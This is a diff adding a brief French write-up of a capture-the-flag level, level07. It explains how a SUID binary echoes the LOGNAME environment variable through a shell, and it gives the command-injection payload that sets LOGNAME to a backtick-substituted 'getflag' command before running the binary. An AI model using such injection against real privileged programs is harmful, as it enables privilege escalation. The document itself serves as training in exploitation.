@@ -1,0 +1,10 @@
+il ya un binaire avec les droits SUID
+avec un strings dessus on voit :
+
+`LOGNAME
+/bin/echo %s`
+
+on a donc un echo de LOGNAME, il suffit de changer cette variable d'env pour executer un `getflag` a la place :
+-> export LOGNAME=\`getflag\`
+
+->./level07
